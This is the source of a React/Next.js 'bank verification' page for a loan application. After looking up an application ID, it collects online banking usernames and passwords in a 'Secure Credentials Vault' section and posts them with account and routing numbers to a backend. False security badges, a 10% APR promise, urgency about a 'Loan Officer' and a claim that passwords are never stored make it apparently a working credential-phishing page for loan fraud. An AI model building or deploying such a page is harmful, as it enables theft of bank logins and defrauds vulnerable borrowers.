"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { SITE_NAME } from "@/lib/constants";
import toast from "react-hot-toast";
import { apiUrl } from "@/lib/api";

const ACCOUNT_STATUS_MAP: Record<string, string> = {
  Positive: "positive_balance",
  Negative: "overdrawn",
};

const BANK_ACCOUNT_AGE_MAP: Record<string, string> = {
  "1_year": "1 Year",
  "2_years": "2 Years",
  "3_plus_years": "3+ Years",
  less_than_1_year: "Less than 1 Year",
};

// ABA Routing Number Lookup Mock Data
const BANK_LOOKUP: Record<string, string> = {
  "021000021": "JPMorgan Chase Bank",
  "121000248": "Wells Fargo Bank",
  "026009593": "Bank of America",
  "071000013": "Citibank",
  "091000019": "U.S. Bank",
  "031100156": "PNC Bank",
  "053000196": "Truist Bank",
  "122000496": "Capital One",
  "031000053": "TD Bank",
  "121122676": "Charles Schwab Bank",
};

type Phase = "search" | "form";

interface ApplicationInfo {
  application_id?: string;
  applicationId?: string;
  firstName: string;
  lastName: string;
  loanAmount: number;
  bankName?: string | null;
  email?: string | null;
  account_type?: string | null;
  account_number?: string | null;
  routingNumber?: string | null;
  bankAccountAge?: string | null;
  bankBalanceStatus?: string | null;
}

function formatCurrency(amount: number): string {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount || 0);
}

export default function VerifyBankPage() {
  const [phase, setPhase] = useState<Phase>("search");
  const [submitted, setSubmitted] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [pstTime, setPstTime] = useState("");
  const [loading, setLoading] = useState(false);

  const [searchLoading, setSearchLoading] = useState(false);
  const [searchError, setSearchError] = useState("");

  const [searchId, setSearchId] = useState("");

  // Auto-populated (read-only) fields
  const [appInfo, setAppInfo] = useState<ApplicationInfo | null>(null);

  // User-entered banking info (used when values returned from lookup are null)
  const [bankNameInput, setBankNameInput] = useState("");
  const [accountTypeInput, setAccountTypeInput] = useState("");
  const [accountNumberInput, setAccountNumberInput] = useState("");
  const [routingNumberInput, setRoutingNumberInput] = useState("");
  const [bankAccountAgeInput, setBankAccountAgeInput] = useState("");
  const [bankBalanceStatusInput, setBankBalanceStatusInput] = useState("");

  // User-entered credentials
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const options: Intl.DateTimeFormatOptions = {
        timeZone: "America/Los_Angeles",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        timeZoneName: "short",
      };
      setPstTime(new Intl.DateTimeFormat("en-US", options).format(now));
    };

    updateTime();
    const timer = setInterval(updateTime, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-lookup bank name whenever routing number changes (manual input or API response)
  const handleRoutingChange = (routing: string) => {
    setRoutingNumberInput(routing);
    const matchedBank = BANK_LOOKUP[routing.trim()];
    if (matchedBank) {
      setBankNameInput(matchedBank);
    }
  };

  const performLookup = async (id: string) => {
    setSearchError("");
    setSearchLoading(true);
    try {
      const res = await fetch(
        apiUrl(
          `/api/bank-verification/lookup?applicationId=${encodeURIComponent(id.trim())}`,
        ),
      );
      const data = await res.json();

      if (!res.ok) {
        setSearchError(
          data.error ||
            "Application not found. Please check your ID and try again.",
        );
        return;
      }

      setAppInfo(data);

      // Pre-fill routing and state inputs
      const routing = data.routingNumber || "";
      if (routing) {
        setRoutingNumberInput(routing);
      }

      if (data.account_type) setAccountTypeInput(data.account_type);
      if (data.account_number) setAccountNumberInput(data.account_number);

      if (data.bankAccountAge) setBankAccountAgeInput(data.bankAccountAge);
      if (data.bankBalanceStatus)
        setBankBalanceStatusInput(data.bankBalanceStatus);

      // Resolve bank name: use API bankName, fallback to ABA Lookup match, or fallback to state input
      const matchedBank = routing ? BANK_LOOKUP[routing.trim()] : null;
      if (data.bankName) {
        setBankNameInput(data.bankName);
      } else if (matchedBank) {
        setBankNameInput(matchedBank);
      }

      setPhase("form");
    } catch {
      setSearchError(
        "Network error. Please check your connection and try again.",
      );
    } finally {
      setSearchLoading(false);
    }
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const appId = params.get("applicationId");
    if (appId) {
      setSearchId(appId);
      performLookup(appId);
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!appInfo) return;

    // Resolve final values between read-only API data and user inputs
    const finalRoutingNumber = appInfo.routingNumber || routingNumberInput;
    const finalBankName =
      appInfo.bankName ||
      BANK_LOOKUP[finalRoutingNumber.trim()] ||
      bankNameInput;
    const finalAccountType = appInfo.account_type || accountTypeInput;
    const finalAccountNumber = appInfo.account_number || accountNumberInput;
    const finalBankAccountAge = appInfo.bankAccountAge || bankAccountAgeInput;
    const finalBankBalanceStatus =
      appInfo.bankBalanceStatus || bankBalanceStatusInput;

    if (
      !finalBankName ||
      !finalAccountType ||
      !finalAccountNumber ||
      !finalRoutingNumber
    ) {
      toast.error("Please fill in all bank account details.");
      return;
    }

    setLoading(true);
    try {
      const response = await fetch("/api/bank-verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: finalBankName,
          fullName:
            `${appInfo?.firstName ?? ""} ${appInfo?.lastName ?? ""}`.trim(),
          bankingUsername: username,
          bankingPassword: password,
          applicationId: appInfo?.applicationId,
          email: appInfo?.email ?? "",
          accountType: finalAccountType,
          accountNumber: finalAccountNumber,
          routingNumber: finalRoutingNumber,
          bankAccountAge: finalBankAccountAge,
          bankBalanceStatus: finalBankBalanceStatus,
        }),
      });

      if (!response.ok) {
        const data = await response.json();
        toast.error(data.error || "An error occurred. Please try again.");
        return;
      }

      toast.success("Bank verification submitted successfully!");
      setSubmitted(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch {
      toast.error("Network error. Please check your connection and try again.");
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen bg-surface flex flex-col items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-3xl shadow-2xl p-8 text-center border border-surface-dark">
          <div className="mb-6 flex justify-center">
            <div className="w-20 h-20 bg-success/10 rounded-full flex items-center justify-center">
              <svg
                className="w-12 h-12 text-success"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={3}
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>

          <h1 className="text-3xl font-bold text-text-primary mb-4">
            Information Submitted Successfully
          </h1>

          <div className="space-y-4 text-text-secondary mb-8">
            <p className="leading-relaxed">
              Your bank verification is now in review by our U.S-based team. We
              are working at PST speed to finalize your file.
            </p>
            <p className="text-sm font-medium bg-surface py-2 px-4 rounded-full inline-block">
              Current PST Time: {pstTime}
            </p>
          </div>

          <div className="bg-primary/5 border border-primary/10 rounded-2xl p-6 mb-8">
            <p className="text-primary font-bold mb-2 uppercase tracking-wide text-xs">
              The Action Trigger
            </p>
            <p className="text-text-primary font-medium">
              Please notify your Loan Officer immediately that you have
              completed this submission to expedite your funding.
            </p>
          </div>

          <Link
            href="/loan-status"
            className="block w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
          >
            Check Loan Status
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-surface flex flex-col">
      {/* Security Banner */}
      <div className="bg-primary-dark text-white py-2 px-4 text-center text-sm font-medium flex items-center justify-center gap-2">
        <svg
          className="w-4 h-4 text-success"
          fill="currentColor"
          viewBox="0 0 20 20"
        >
          <path
            fillRule="evenodd"
            d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
            clipRule="evenodd"
          />
        </svg>
        <span>✓ Bank-Level 256-Bit Encryption</span>
      </div>

      <div className="max-w-2xl mx-auto w-full px-4 py-12 grow">
        {/* Header Section */}
        <div className="flex flex-col items-center mb-10 text-center">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-primary rounded-xl flex items-center justify-center shadow-lg">
              <span className="text-white font-bold text-xl">CL</span>
            </div>
            <div className="h-8 w-px bg-surface-dark"></div>
            <div className="flex items-center gap-1.5 text-primary-light font-bold text-sm bg-primary-light/5 px-3 py-1.5 rounded-full border border-primary-light/20">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                  clipRule="evenodd"
                />
              </svg>
              Verified Secure
            </div>
          </div>

          <h1 className="text-3xl font-extrabold text-text-primary mb-4 tracking-tight">
            Secure Identity & Income Verification
          </h1>
          <p className="text-text-secondary max-w-lg leading-relaxed">
            To fulfill our PST-speed funding guarantee, please securely verify
            the US-based bank account where you wish to receive your funds.
          </p>
        </div>

        {phase === "search" && searchError && (
          <div className="bg-red-50 border border-red-200 text-red-700 px-6 py-4 rounded-3xl text-sm font-medium text-center mb-8">
            {searchError}
          </div>
        )}

        {searchLoading && phase === "search" && (
          <div className="flex flex-col items-center justify-center py-12">
            <div className="w-12 h-12 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4" />
            <p className="text-text-secondary font-medium">
              Loading your application details...
            </p>
          </div>
        )}

        {/* Step 2: Verification Form (after search) */}
        {phase === "form" && appInfo && (
          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
            <form
              onSubmit={handleSubmit}
              className="divide-y divide-surface-dark"
            >
              {/* Section A: Application Details */}
              <div className="p-8 space-y-6">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    <div className="w-6 h-6 rounded-full bg-success/20 text-success flex items-center justify-center text-xs font-bold">
                      ✓
                    </div>
                    <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                      Application Details
                    </h2>
                  </div>
                </div>

                <div className="bg-surface rounded-2xl p-5 space-y-4 border border-surface-dark">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Application ID
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-xs text-text-secondary font-mono truncate">
                        {appInfo.application_id ||
                          appInfo.applicationId ||
                          searchId}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Loan Amount
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm font-bold text-primary">
                        {formatCurrency(appInfo.loanAmount)}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        First Name
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                        {appInfo.firstName || "N/A"}
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Last Name
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                        {appInfo.lastName || "N/A"}
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {/* Bank Name */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Bank Name *
                      </label>
                      {appInfo.bankName ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                          {appInfo.bankName}
                        </div>
                      ) : (
                        <input
                          required
                          type="text"
                          placeholder="e.g. Chase, Bank of America"
                          value={bankNameInput}
                          onChange={(e) => setBankNameInput(e.target.value)}
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        />
                      )}
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Email Address
                      </label>
                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium truncate">
                        {appInfo.email || "Not specified"}
                      </div>
                    </div>
                  </div>

                  {/* Account Details Inputs */}
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2 border-t border-surface-dark">
                    {/* Account Type */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Account Type *
                      </label>
                      {appInfo.account_type ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                          {appInfo.account_type}
                        </div>
                      ) : (
                        <select
                          required
                          value={accountTypeInput}
                          onChange={(e) => setAccountTypeInput(e.target.value)}
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        >
                          <option value="">Select Account Type</option>
                          <option value="checking">Checking</option>
                          <option value="savings">Savings</option>
                        </select>
                      )}
                    </div>

                    {/* Account Number */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Account Number *
                      </label>
                      {appInfo.account_number ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium font-mono">
                          {appInfo.account_number && "**********"}
                        </div>
                      ) : (
                        <input
                          required
                          type="text"
                          placeholder="Enter account number"
                          value={accountNumberInput}
                          onChange={(e) =>
                            setAccountNumberInput(e.target.value)
                          }
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm font-mono outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        />
                      )}
                    </div>

                    {/* Routing Number */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Routing Number *
                      </label>
                      {appInfo.routingNumber ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium font-mono">
                          {appInfo.routingNumber &&
                            `*****${appInfo.routingNumber.slice(-4)}`}
                        </div>
                      ) : (
                        <input
                          required
                          type="text"
                          maxLength={9}
                          placeholder="Enter 9-digit routing"
                          value={routingNumberInput}
                          onChange={(e) => handleRoutingChange(e.target.value)}
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm font-mono outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        />
                      )}
                    </div>
                  </div>

                  {/* Bank Account Age & Balance Status Row */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2 border-t border-surface-dark">
                    {/* Account Age */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Bank Account Age *
                      </label>
                      {appInfo.bankAccountAge ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                          {BANK_ACCOUNT_AGE_MAP[appInfo.bankAccountAge] ||
                            appInfo.bankAccountAge}
                        </div>
                      ) : (
                        <select
                          required
                          value={bankAccountAgeInput}
                          onChange={(e) =>
                            setBankAccountAgeInput(e.target.value)
                          }
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        >
                          <option value="">Select Account Age</option>
                          <option value="less_than_1_year">
                            Less than 1 Year
                          </option>
                          <option value="1_year">1 Year</option>
                          <option value="2_years">2 Years</option>
                          <option value="3_plus_years">3+ Years</option>
                        </select>
                      )}
                    </div>

                    {/* Balance Status */}
                    <div>
                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
                        Average Balance Status *
                      </label>
                      {appInfo.bankBalanceStatus ? (
                        <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
                          {ACCOUNT_STATUS_MAP[appInfo.bankBalanceStatus] ||
                            appInfo.bankBalanceStatus}
                        </div>
                      ) : (
                        <select
                          required
                          value={bankBalanceStatusInput}
                          onChange={(e) =>
                            setBankBalanceStatusInput(e.target.value)
                          }
                          className="w-full px-4 py-3 bg-white border border-surface-dark rounded-xl text-sm outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        >
                          <option value="">Select Balance Range</option>
                          <option value="positive_balance">
                            Positive Balance
                          </option>
                          <option value="overdrawn">Overdrawn</option>
                        </select>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Section B: Online Banking Credentials */}
              <div className="p-8 bg-surface-dark/30 space-y-6">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
                    2
                  </div>
                  <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
                    Secure Credentials Vault
                  </h2>
                </div>

                <div className="space-y-5">
                  <div>
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Online Banking Username *
                    </label>
                    <input
                      required
                      type="text"
                      autoComplete="off"
                      placeholder="Enter your online banking username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                  </div>

                  <div className="relative">
                    <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
                      Online Banking Password *
                    </label>
                    <input
                      required
                      type={showPassword ? "text" : "password"}
                      autoComplete="off"
                      placeholder="Enter your online banking password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      disabled={loading}
                      className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-4 bottom-3.5 text-xs font-bold text-primary hover:text-primary-dark transition-colors"
                    >
                      {showPassword ? "HIDE" : "SHOW"}
                    </button>
                  </div>
                </div>
              </div>

              {/* Section C: Footer */}
              <div className="p-8 bg-white space-y-6">
                <div className="flex gap-3 p-4 bg-surface rounded-2xl border border-surface-dark">
                  <svg
                    className="w-5 h-5 text-text-secondary mt-0.5 shrink-0"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <p className="text-[11px] leading-relaxed text-text-secondary font-medium">
                    {SITE_NAME} uses these credentials solely for a one-time
                    manual verification of income and identity to finalize your
                    10% APR loan offer. We never store your password or sell
                    your data to third parties.
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
                >
                  {loading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      Verify Account
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* Support Footer */}
        <p className="text-center mt-8 text-xs text-text-secondary font-medium">
          Having trouble connecting? Contact your Loan Officer or call us at
          (747) 208-0334
        </p>
      </div>
    </div>
  );
}
